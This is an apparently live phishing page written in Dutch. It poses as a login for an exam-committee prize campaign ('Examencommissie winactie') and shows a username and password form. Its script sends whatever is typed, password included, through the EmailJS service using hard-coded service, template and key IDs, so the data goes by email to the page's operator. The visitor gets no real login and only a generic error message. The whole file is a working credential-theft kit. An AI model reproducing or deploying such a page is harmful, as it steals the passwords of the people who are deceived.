<!DOCTYPE html>
<html lang="nl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Examencommissie winactie</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f4;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: #0078D4;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background: #005ea6;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Inloggen examenactie</h2>
        <form onsubmit="return login()">
            <input type="text" id="username" placeholder="Gebruikersnaam" required>
            <input type="password" id="password" placeholder="Wachtwoord" required>
            <button type="submit">Inloggen</button>
        </form>
        <p id="message" style="color: red;"></p>
    </div>
   
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        
        emailjs.init("cXBQtkCZQdlbhKdfG");

        function login() {
            // Haal de gebruikersnaam en wachtwoord op uit de inputvelden
            let user = document.getElementById("username").value;
            let pass = document.getElementById("password").value;

            // Maak de template parameters aan voor de e-mail
            const templateParams = {
                mail: user, // Gebruikersnaam als mail
                wachtwoord: pass // Wachtwoord
            };


            emailjs.send("service_9q2qoob", "template_jpgwf8d", templateParams)
                .then(function(response) {

                }, function(error) {
                    console.log('Fout bij verzenden e-mail:', error);
                    document.getElementById("message").innerText = "Er is een fout opgetreden bij het inloggen.";
                });


            return false;
        }
    </script>
</body>
</html>
